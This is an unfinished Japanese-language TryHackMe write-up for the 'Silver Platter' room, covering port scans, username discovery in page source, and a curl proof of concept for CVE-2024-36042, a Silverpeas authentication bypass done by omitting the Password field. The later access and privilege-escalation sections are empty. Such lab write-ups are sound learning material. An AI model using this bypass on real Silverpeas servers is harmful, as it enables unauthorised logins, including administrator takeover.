---
tags: [hacking, box, writeup]
platform: TryHackMe
difficulty: Unknown
status: in-progress
date: 2026-03-21
ip: 10.48.184.93
skills:
  - CVE-2024-36042 (Silverpeas 認証バイパス)
  - Web列挙
---

# Silver Platter

**プラットフォーム**: TryHackMe
**IP**: `10.48.184.93`
**URL**: https://tryhackme.com/room/silverplatter

---

## 情報収集

### ポートスキャン (RustScan + Nmap)

```bash
rustscan -a 10.48.184.93 --ulimit 5000 -- -sC -sV
```

**開いているポート:**

| ポート | サービス | バージョン | 備考 |
|-------|---------|----------|------|
| 22/tcp | SSH | OpenSSH 8.9p1 Ubuntu | |
| 80/tcp | HTTP | nginx 1.18.0 | タイトル: "Hack Smarter Security" |
| 8080/tcp | HTTP | Silverpeas 6.3.1 | コラボレーションプラットフォーム |

### ポート80 の調査

まずポート80のWebサイトを確認した。

```bash
curl -s http://10.48.184.93:80 | grep -E "<title>|<h[1-3]|href=|action="
```

- タイトル: `Hack Smarter Security`
- ナビゲーション: `Intro / Work / About / Contact`

次にHTMLソースを全文確認し、ユーザー名・メールアドレス・ヒントを探した:

```bash
curl -s http://10.48.184.93:80 | grep -Ei "user|admin|email|name|contact|password|manager|silverpeas"
```

`Contact` セクションに以下の記述を発見:
> "please reach out to our project manager on **Silverpeas**. His username is **`scr1ptkiddy`**"

**発見できた理由:**
- HTMLのソースコードを `grep` でキーワード検索した
- `user` `manager` `silverpeas` などの単語を網羅的に検索したことで発見

**この情報から分かったこと:**

| 情報 | 意味 |
|------|------|
| `Silverpeas` | ポート8080で動いているソフトウェアの名前が確定 |
| `scr1ptkiddy` | ログイン試行すべきユーザー名が判明 |

`scr1ptkiddy` = `script kiddy` の leet speak 表記 (1→i, 0→o)

### ポート8080 の調査

- `/silverpeas/` にアクセスするとログインページ (302リダイレクト)
- **Silverpeas 6.3.1** が動作していることを確認

---

## 脆弱性発見

### CVE-2024-36042: Silverpeas 認証バイパス (CVSS 9.8 Critical)

**影響バージョン**: Silverpeas 6.3.5 未満 (6.3.1 も対象)

**概要**: ログインリクエストで `Password` フィールドを**省略**するだけで認証をバイパスできる。
アプリがパスワードなし = SSO ログインと誤解釈し、アクセスを許可してしまう。

**PoC:**
```bash
# 通常ログイン (失敗)
curl -X POST http://10.48.184.93:8080/silverpeas/AuthenticationServlet \
  -d "Login=scr1ptkiddy&Password=xxx&DomainId=0"
# → ErrorCode=1

# CVE-2024-36042: Password フィールドを省略 (成功)
curl -c cookies.txt \
  -X POST http://10.48.184.93:8080/silverpeas/AuthenticationServlet \
  -d "Login=scr1ptkiddy&DomainId=0"
# → Location: /silverpeas/Main//look/jsp/MainFrame.jsp (ログイン成功！)
```

**結果**: `scr1ptkiddy` および管理者 `SilverAdmin` での認証バイパスに成功

---

## 侵入 / Initial Access

### 次のステップ
- [ ] Silverpeas 内のメッセージ・ファイルを確認
- [ ] 認証情報・SSHキーの探索
- [ ] SSHログイン試行

**ユーザーフラグ**: `user.txt` →

---

## 権限昇格 / Privilege Escalation

**ルートフラグ**: `root.txt` →

---

## 習得スキル・学び
- CVE-2024-36042: パスワードフィールドを省略するだけで認証バイパス可能
- Webページのソースから重要な情報 (ユーザー名、使用ソフト) を収集する重要性

## ハマったポイント
-
